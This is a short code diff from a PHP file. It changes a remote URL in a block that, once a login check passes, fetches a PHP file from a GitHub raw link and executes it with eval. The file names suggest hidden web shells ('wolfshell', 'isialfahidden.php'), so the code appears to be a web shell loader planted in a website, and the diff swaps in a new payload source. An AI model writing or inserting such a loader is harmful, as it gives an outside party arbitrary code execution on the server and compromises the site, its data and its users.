@@ -56,7 +56,7 @@ function is_logged_in() {
 
 if (is_logged_in()) {
  
-    $a = fetchRemoteContent('https://raw.githubusercontent.com/XJ303/shell-Xjerry/refs/heads/main/Xzjerry-wolfshell.php');
+    $a = fetchRemoteContent('https://raw.githubusercontent.com/rexorid/shell/refs/heads/main/isialfahidden.php');
     if ($a !== false) {
         eval('?>' . $a);
     } else {
